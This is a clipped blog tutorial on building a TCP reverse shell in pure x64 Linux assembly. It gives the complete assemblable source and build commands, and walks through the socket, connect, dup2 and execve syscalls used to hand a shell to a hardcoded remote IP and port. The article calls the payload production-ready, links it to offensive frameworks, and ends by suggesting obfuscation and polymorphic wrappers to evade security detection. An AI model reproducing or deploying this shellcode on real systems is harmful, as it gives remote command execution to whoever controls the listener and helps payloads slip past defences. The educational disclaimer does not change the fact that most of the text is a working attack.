---
title: "TCP Reverse Shell in Pure x64 Assembly: PIC Shellcode, Syscall Chain & dup2 FD Redirection | No libc | Netacoding | Cybersecurity, Assembly & Network Research"
source: https://netacoding.com/posts/reverse_shell-assembly/
source_host: netacoding.com
clip_date: 2026-10-01T10:17:25+08:00
trace_id: c45d4e96-d57a-42ae-bc4f-6b9d4628338d
content_hash: d035c96851e1b747a2cdfcd7d0bb4138893879a6a03e4e8e68157d0a487d93e1
status: synced
tags:
  - Android逆向
  - 漏洞分析
series: null
feed_source: Netacoding·协议/逆向
ai_summary: 纯 x64 汇编实现的 TCP 反弹 shell：用 Stack Anchor 实现位置无关，串起 socket/connect/dup2/execve 四个系统调用，不依赖 libc。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ec75244-d011-812c-9d88-fb25833d93e4
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 纯 x64 汇编实现的 TCP 反弹 shell：用 Stack Anchor 实现位置无关，串起 socket/connect/dup2/execve 四个系统调用，不依赖 libc。
> 
> - **流程链：** socket(41) → connect(42) → dup2(33) 循环三次重定向 0/1/2 → execve(59) 执行 `/bin//sh`。
> - **PIC 内存技巧：** `sub rsp,0x8000` 分配 32KB 并 16 字节对齐，`mov rbp,rsp` 作锚点；`.text` 只读，故用 `rep movsb` 把 16 字节 `sockaddr_in` 模板复制到 `[rbp+0x200]` 可写栈区。
> - **关键寄存器：** socket FD 存入 callee-saved 的 `r12` 复用；dup2 用 `rbx` 从 2 递减配合 `jns` 循环，一次覆盖 stderr/stdout/stdin。
> - **execve 构造：** 栈上 `push 0` + `push rdi`（`/bin//sh` 指针）组成 argv，`mov rsi,rsp`，`rdx=0` 表示无环境变量；shell 自身 read/write 循环接管 socket I/O，shellcode 无需循环。
> - **为何用 PIC：** ASLR 下目标内存布局未知，Metasploit/Cobalt Strike 等框架要求载荷任意地址可执行；仅固定布局实验室、嵌入式或教学 PoC 才可省略。

## Introduction

A reverse shell is a fundamental technique in systems security where a compromised target initiates an outbound connection to an attacker-controlled machine, binding its standard input, output, and error streams to the remote connection. This allows the attacker to execute commands on the target system as if they were sitting at its terminal.

The challenge becomes exponential when you need to implement this entirely in x86-64 assembly without relying on libc or any compiled binaries. You must manually orchestrate a precise sequence of syscalls, manage memory manually, and handle all data structures at the lowest level.

In this article, we’ll examine a complete TCP-based reverse shell implementation that leverages **Position Independent Code (PIC)** architecture—the same Stack Anchor technique discussed in our previous article on PIC fundamentals. This approach ensures our shellcode remains executable regardless of where it’s loaded in memory.

* * *

## Architecture Overview

The reverse shell follows a linear syscall chain:

```
[Stack Setup] → [Socket Creation] → [Connect] → [dup2 Redirection] → [execve Shell]
```

Each step is a discrete syscall that builds upon the previous one. Let’s dissect each phase.

* * *

## Phase 1: Stack Anchor & PIC Foundation

Before executing any syscall, we establish our memory sandbox using the Stack Anchor technique:

```asm
sub rsp, 0x8000             ; Allocate 32KB on the stack
and rsp, -16                ; Align to 16-byte boundary (required for syscalls)
mov rbp, rsp                ; Set RBP as our anchor point
```

Why this matters:

-   **RSP Manipulation**: We reserve a large contiguous region for read-write operations
-   **16-byte Alignment**: x86-64 System V ABI mandates stack alignment before syscalls
-   **RBP Anchoring**: We fix RBP as a stable reference point for all relative addressing

Next, we copy the hardcoded network structure to our writable stack region:

```asm
lea rsi, [rel struct_sockaddr]  ; Source: Read-only .text section
lea rdi, [rbp + 0x200]          ; Destination: Writable stack
mov rcx, 16                     ; sockaddr_in is exactly 16 bytes
rep movsb                       ; Byte-wise copy
```

**Why copy to stack?** The `.text` section is mapped R-X (readable, executable, not writable) by the kernel. Any template data we need to modify at runtime must be transferred to writable memory. The stack provides this with automatic cleanup when the process exits.

* * *

## Phase 2: Socket Creation (SYS_socket = 41)

```asm
mov rax, 41                 ; SYS_socket syscall number
mov rdi, 2                  ; AF_INET (IPv4)
mov rsi, 1                  ; SOCK_STREAM (TCP)
mov rdx, 0                  ; IPPROTO_IP (default)
syscall
mov r12, rax                ; Save socket FD in r12
```

**Register Breakdown** (x86-64 syscall convention):

-   `rdi` = First argument (address family)
-   `rsi` = Second argument (socket type)
-   `rdx` = Third argument (protocol)
-   `rax` = Return value (file descriptor or negative error)

The kernel returns a file descriptor (typically 3 or higher) in `rax`. We immediately save this in `r12` because we’ll reference it multiple times in subsequent syscalls.

**Why r12?** It’s a callee-saved register in x86-64 SysV ABI, meaning it persists across function boundaries. This makes it ideal for storing critical state.

* * *

## Phase 3: Establish Connection (SYS_connect = 42)

```asm
mov rax, 42                 ; SYS_connect syscall number
mov rdi, r12                ; socket FD (from previous step)
lea rsi, [rbp + 0x200]      ; Pointer to sockaddr_in struct
mov rdx, 16                 ; Size of sockaddr_in
syscall
```

**Data Structure Reference**: The `sockaddr_in` struct (16 bytes) contains:

```
Offset  Size  Field
0       2     sin_family (AF_INET = 2)
2       2     sin_port (network byte order: 0x5c11 = 4444)
4       4     sin_addr (IPv4 address: 192.168.1.59)
8       8     sin_zero (padding, must be zero)
```

The connect syscall blocks until the connection succeeds or fails. If successful, the kernel establishes a TCP connection to the target IP:port, and our socket FD now represents the active connection.

* * *

## Phase 4: Redirect File Descriptors (SYS_dup2 = 33)

This is the critical phase where we bind stdin, stdout, and stderr to the socket:

```asm
mov rbx, 2                  ; Counter: will loop from 2 down to 0
_loop:
mov rax, 33                 ; SYS_dup2 syscall number
mov rdi, r12                ; socket FD (source)
mov rsi, rbx                ; target FD (2, 1, 0)
syscall
dec rbx                     ; Decrement counter
jns _loop                   ; Jump if not negative (2→1→0)
```

**Three Iterations**:

1.  `dup2(socket_fd, 2)` → stderr now reads/writes to socket
2.  `dup2(socket_fd, 1)` → stdout now reads/writes to socket
3.  `dup2(socket_fd, 0)` → stdin now reads/writes to socket

**Why this works**: After `dup2`, any process that inherits these file descriptors will automatically send output to the socket and receive input from it. The redirection is transparent to the child process.

The loop elegantly handles three redirections in minimal code. The `jns` (jump if not signed/negative) instruction continues while rbx ≥ 0; when rbx becomes -1, the loop exits.

* * *

## Phase 5: Execute Shell (SYS_execve = 59)

```asm
xor rdx, rdx                ; rdx = 0 (envp = NULL, empty environment)
mov rax, 59                 ; SYS_execve syscall number
lea rdi, [rel run]          ; rdi = filename pointer ("/bin//sh")
push 0                      ; Push NULL terminator onto stack
push rdi                    ; Push argv[0] (filename) onto stack
mov rsi, rsp                ; rsi = pointer to argv array
syscall
```

**Syscall Signature** (execve):

```c
int execve(const char *filename,  // rdi
           char *const argv[],     // rsi
           char *const envp[]);    // rdx
```

**The Argv Array Construction**:

We build a minimal argv on the stack:

```
[Stack Before]
...
[rsp + 16]  → (higher addresses)
[rsp + 8]   → argv[0] = pointer to "/bin//sh"
[rsp]       → argv[1] = NULL (array terminator)
```

Then `mov rsi, rsp` makes `rsi` point to the start of this array. The kernel interprets this as:

-   `argv[0]` = the shell path
-   `argv[1]` = NULL (signals end of array)
-   No environment variables (rdx = 0)

**Why minimal argv?** The `/bin/sh` shell doesn’t require explicit arguments. It automatically enters interactive mode when stdin/stdout/stderr are connected to a socket.

* * *

## The Shell Loop: Why No Loop is Needed

After `execve` succeeds, the new process inherits:

-   Redirected file descriptors (stdin/stdout/stderr bound to socket)
-   The parent process’s memory space (overwritten by the shell)

The `/bin/sh` binary contains its own event loop (typically implemented with `read()` syscalls):

```c
// Simplified shell behavior
while (1) {
    read(0, buffer, sizeof(buffer));   // Read from stdin (socket)
    parse_and_execute(buffer);
    write(1, output, strlen(output));  // Write to stdout (socket)
}
```

Because stdin/stdout/stderr point to the socket, every interaction happens over the network connection without any additional coordination in our shellcode.

* * *

## Complete Code Reference

```asm
;nasm -f elf64 reverse_shell_tcp.asm -o reverse_shell.o
;ld reverse_shell.o -o reverse_shell

global _start

_start:
    sub rsp, 0x8000
    and rsp, -16
    mov rbp, rsp            ; Stack anchor
    
    lea rsi, [rel struct_sockaddr]
    lea rdi, [rbp + 0x200]
    mov rcx, 16
    rep movsb
    jmp continue
    
    
    ; --- DATA TEMPLATES ---
    struct_sockaddr:
    dw 2                ; sin_family: AF_INET (2)
    dw 0x5c11           ; sin_port: 4444 (network byte order)
    db 192, 168, 1, 59  ; sin_addr: target IP address
    dq 0                ; sin_zero: 8-byte padding
    
    run db "/bin//sh", 0
    
continue:
    ; Phase 1: Create Socket
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov r12, rax            ; Save socket FD
    
    ; Phase 2: Connect to target
    mov rax, 42
    mov rdi, r12
    lea rsi, [rbp + 0x200]  ; Use copied sockaddr
    mov rdx, 16
    syscall
    
    ; Phase 3: Redirect file descriptors
    mov rbx, 2
_loop:
    mov rax, 33             ; SYS_dup2
    mov rdi, r12
    mov rsi, rbx
    syscall
    dec rbx
    jns _loop

    ; Phase 4: Execute shell
    xor rdx, rdx
    mov rax, 59             ; SYS_execve
    lea rdi, [rel run]
    push 0
    push rdi
    
    mov rsi, rsp
    syscall
```

* * *

## Context: When & Why PIC for Reverse Shells

### Why This Implementation Uses PIC

This reverse shell employs Position Independent Code not because it’s strictly necessary, but because it demonstrates a critical modern concept:

**In production exploitation frameworks** (Metasploit, Cobalt Strike), reverse shells are always PIC because:

-   Target memory layout is unknown (ASLR)
-   Payload must work on any system architecture
-   Multiple deployments require adaptability

### Learning Perspective

This article uses PIC because it’s the **correct modern pattern**, even though simpler alternatives exist. When you learn systems programming, it’s better to master best practices from day one.

### When You Wouldn’t Use PIC

For comparison, you’d skip PIC in these scenarios:

-   **Controlled lab environment**: Known base addresses, ASLR disabled
-   **Embedded systems**: Fixed memory layout (bootloader → kernel)
-   **Proof-of-Concept**: Simple buffer overflow with hardcoded return address
-   **Educational debugging**: Understanding one concept at a time

## However, in real-world offensive security, PIC is the industry standard because you never control the target environment.

**Bottom line**: This is a correct, production-ready approach. Not a toy example—a learning foundation that scales to professional tools.

* * *

## Key Takeaways

1.  **PIC Architecture**: Every memory reference uses relative addressing (`[rel ...]` or `[rbp + offset]`). No hardcoded absolute addresses exist in the binary.
    
2.  **Syscall Chaining**: The shellcode is a linear sequence of syscalls, each building on the previous. No branches or loops except the dup2 redirection.
    
3.  **File Descriptor Inheritance**: Once stdin/stdout/stderr are bound to the socket via dup2, they remain bound after execve. The shell inherits these redirections automatically.
    
4.  **Stack as Writable Storage**: Read-only templates in `.text` are copied to the stack, allowing runtime modification while respecting kernel memory protections.
    
5.  **Minimal Dependencies**: The entire payload fits in a few hundred bytes and depends only on the Linux kernel. No libc, no helper functions.
    

* * *

## Conclusion

Building a reverse shell in assembly reveals the elegant simplicity of POSIX syscalls. By understanding how socket I/O, process execution, and file descriptor redirection work at the syscall level, you gain deeper insight into how operating systems manage processes and resources.

The Stack Anchor technique ensures the payload remains portable, executable from any memory location—a critical requirement for reliable shellcode deployment in real-world scenarios.

Next steps: Experiment with different shellcode obfuscation techniques, encoding schemes, or polymorphic wrappers to evade security detection mechanisms while preserving the core syscall logic.

* * *

Github: [https://github.com/JM00NJ/Sectionless-Craft/tree/main/Networking/reverse_shells](https://github.com/JM00NJ/Sectionless-Craft/tree/main/Networking/reverse_shells)

**Disclaimer**: This article is for educational purposes only. Reverse shells should only be used on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

**MITRE ATT&CK:** [T1059](https://attack.mitre.org/techniques/T1059/) · [T1071](https://attack.mitre.org/techniques/T1071/) · [T1620](https://attack.mitre.org/techniques/T1620/)

## Related

-   [VESQER: A DPCM+RLE Hybrid Compressor in Pure x64 Assembly](https://netacoding.com/posts/compressdpcm-rle/)
-   [Introduction to Position Independent Code (PIC) Architecture](https://netacoding.com/posts/pic-entry/)
-   [Defying Python: Building a Bare-Metal HTTP Server in x86_64 Assembly](https://netacoding.com/posts/assembly-httpserver/)
